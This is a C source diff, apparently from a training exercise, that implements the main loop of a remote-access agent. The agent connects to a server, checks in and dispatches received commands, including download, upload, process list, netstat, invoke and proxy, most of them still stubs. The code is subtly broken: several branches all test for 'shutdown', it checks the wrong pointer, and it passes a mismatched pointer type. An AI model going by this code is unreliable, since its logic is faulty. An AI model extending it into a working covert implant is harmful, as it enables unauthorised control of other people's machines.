@@ -37,22 +37,59 @@ int main()
 {
     int agent_fd = 0;
     Response *response = NULL;
+    Response **cmd_rsp = &response;
+    Command *next_cmd = NULL;
+    bool should_run = true;
+
     // call our hello world function
     say_hello();
 
     // Agent logic
-        // connect
+    // connect
     agent_fd = connect_to_server();
-        // Send checkin
+
+    // Send checkin
     response = checkin_command();
     send_response(agent_fd, response);
-	// begin main execution loop
-    // use fd for while condition
-        	// receive_command (see Networking section below)
 
-        	// perform_command
-        	// send_response
-		// repeat until shutdown command is received
+    //Free response for new commands loops
+    free_response(response);
+    response = NULL;
+
+	// begin main execution loop
+    while(should_run){
+        //Receive_command (see Networking section below), store in next_cmd
+        next_cmd = receive_command(agent_fd);
+
+        //Validate cmd is not null
+        if(next_cmd == NULL){
+            printf("Recieved command was NULL");
+            should_run = false;
+            break;
+        }
+        
+        //Perform given command
+        should_run = perform_command(next_cmd, cmd_rsp); //**rsp_out is asking for a location of where to store the output of perform command 
+
+        if(response == NULL){
+            printf("Command response was null\n");
+            should_run = false;
+            break;
+        }
+        //based off cmd, should i continue?
+        
+        //Send response
+        send_response(agent_fd, cmd_rsp);
+
+		//Repeat until shutdown command is received. Which means cease operations on agent, cleanup resources, and bug out
+
+        
+        //Free memory and wrangle them pointers
+        free_response(response);
+        response = NULL;
+        free_command(next_cmd);
+        next_cmd = NULL;
+    }
 
     return 0;
 }
@@ -67,43 +104,76 @@ int main()
  */
 static bool perform_command(Command *cmd, Response **rsp_out)
 {
-    
+    bool should_continue = true;
+
     // perform an "if else" tree checking the command against all known command strings
     // receiving a valid command should result in calling the appropriate command function
     // if the shutdown command is received, an appropriate response should be returned to 
     // the server, then the client should exit
 
-    /* Check if recieved command parameter are valid
-    char* cmd;
-    uint32_t cmd_len;
-    char* args;
-    uint32_t  args_len;
+    //Initial input validation
+    if(!cmd || !*rsp_out){
+        printf("No command was passed in, or there is no command response\n");
+        should_continue = false;
+    }
+    //Validating command properties
+    if (!(cmd->cmd) || (cmd->cmd_len) <= 0 || !(cmd->args) || (cmd->args_len) <= 0){    
+        printf("Some command property is null or missing\n");
+        should_continue = false;
+    }
 
-    is the total length of the message an unsigned int32?
-    is cmd_len an unsigned int32?
-    is the length of the args string an unsigned int32?  
+    //Check if command exists from known good commands (ex do I have a hostname command? Yes? then execute)
+
+    //Shutdown
+    if(0 == strncmp(cmd->cmd, "shutdown", strlen("shutdown"))){
+        *rsp_out = alloc_response(0, SHUTDOWN_MSG, strlen(SHUTDOWN_MSG));
+        RR_DEBUG_PRINT("received: shutdown command\n")
+        should_continue = false;
+
+    }
+    else if(0 == strncmp(cmd->cmd, "sleep", strlen("sleep"))){                //Sleep
+        *rsp_out = sleep_command(cmd);
+        RR_DEBUG_PRINT("received: sleep command\n")
+        
     
-    cmd->cmd_len
-    Input validation for pointers, do I have a Null pointer?
-        NULL != cmd, null != rsp_out
+    }
+    else if(0 == strncmp(cmd->cmd, "download", strlen("download"))){         //Download
+        RR_DEBUG_PRINT("received: download command\n")
 
-    */
-
-    //Check if command exists from known goof commands (ex do I have a hostname command? Yes? then execute)
-
+    }
+    else if(0 == strncmp(cmd->cmd, "shutdown", strlen("shutdown"))){
+        RR_DEBUG_PRINT("received: upload command\n")
+    }
+    else if(0 == strncmp(cmd->cmd, "shutdown", strlen("shutdown"))){
+        RR_DEBUG_PRINT("received: hostname command\n")
+    }
+    else if(0 == strncmp(cmd->cmd, "shutdown", strlen("shutdown"))){
+        RR_DEBUG_PRINT("received: process list command\n")
+    }
+    else if(0 == strncmp(cmd->cmd, "shutdown", strlen("shutdown"))){
+        RR_DEBUG_PRINT("received: netstat command\n")
+    }
+    else if(0 == strncmp(cmd->cmd, "shutdown", strlen("shutdown"))){
+        RR_DEBUG_PRINT("received: invoke command\n")
+    }
+    else if(0 == strncmp(cmd->cmd, "shutdown", strlen("shutdown"))){
+        RR_DEBUG_PRINT("received: proxy command\n")
+    }
+    
+    
+    
+    
     
 
-    RR_DEBUG_PRINT("received: shutdown command\n")
-    RR_DEBUG_PRINT("received: sleep command\n")
-    RR_DEBUG_PRINT("received: download command\n")
-    RR_DEBUG_PRINT("received: upload command\n")
-    RR_DEBUG_PRINT("received: hostname command\n")
-    RR_DEBUG_PRINT("received: process list command\n")
-    RR_DEBUG_PRINT("received: netstat command\n")
-    RR_DEBUG_PRINT("received: invoke command\n")
-    RR_DEBUG_PRINT("received: proxy command\n")
+    else{
+        printf("Not a valid command\n");
+    }
 
-    return 1;
+    
+    
+    
+
+    return should_continue;
 }
 
 
@@ -128,14 +198,13 @@ static bool send_response(int sock_fd, Response *rsp)
     while(total_tx < stream_size){
         bytes_tx = send(sock_fd, serialized_response + total_tx, stream_size - total_tx, 0);
         if(bytes_tx == -1){
+            printf("Error sending response\n");
             checkfree(serialized_response);
             return true;
         }
 
         total_tx += bytes_tx;
     }
-
-    printf("Response has been sent\n");
     checkfree(serialized_response);
     return false;
 }
@@ -157,38 +226,44 @@ static Command *receive_command(int sock_fd)
     //TODO error handling for <=0 conditions ((0)bytes read in, connection closed; error reading (-1))
     read_ret_val = read(sock_fd, &msg_size, 4);
 
+    if(read_ret_val < 0){
+        printf("Error reading in message\n");
+        return NULL;
+    } else if (read_ret_val == 0){
+        printf("0 bytes read in or connection was closed\n");
+        return NULL;
+    }
+    
+
     msg_size = ntohl(msg_size);
 
     //Allocate memory for read stream
-    read_stream = calloc(msg_size, sizeof(char)); //Ask Brandon, what is the difference btw this instantiation of calloc and
-                                                  // calloc(1, msg_size * sizeof(char))?
-                                                  
-    // Validate message (make sure its not null, nothing to read, connection was closed, message values dont match up)
+    read_stream = calloc(msg_size, sizeof(char));
 
-    //Do recieve until, skip message timeout
-    //While size read dows not equal msg size:
-    //  do ret_val read combo
-    //      if > 0
-            //     amnt_recv'd += ret_val(buffer + amount recv'd)
-            // else
-            //     PANIC!!!!
-
+    //Read in the expected amount of data, then check to see if that amount was actually recieved. If it was, continue onto deserialization.
+    //If not, increment the read_stream offset (size_read) & repeat the process. Print error message & return NULL if read() returns -1
     while (size_read != msg_size){
-        read_ret_val = read(sock_fd, read_stream, msg_size);
+        read_ret_val = read(sock_fd, read_stream + size_read, msg_size);
         if (read_ret_val >= 0)
             size_read += read_ret_val;
         else{
             printf("Time to panic\n");
-            return NULL;
+            goto CLEANUP;
        }
     }
 
-    // deserialize the command received from the server and populate a Command struct
+    //Deserialize the stream received from the server and populate a Command struct
     cmd = deserialize_command(msg_size, read_stream);
 
-    // free memory of read_stream
+    //Free memory of read_stream
     free(read_stream);
+    read_stream = NULL;
 
+CLEANUP:
+    if(read_stream != NULL){
+        free(read_stream);
+        read_stream = NULL;
+    }
     return cmd;
 }
 
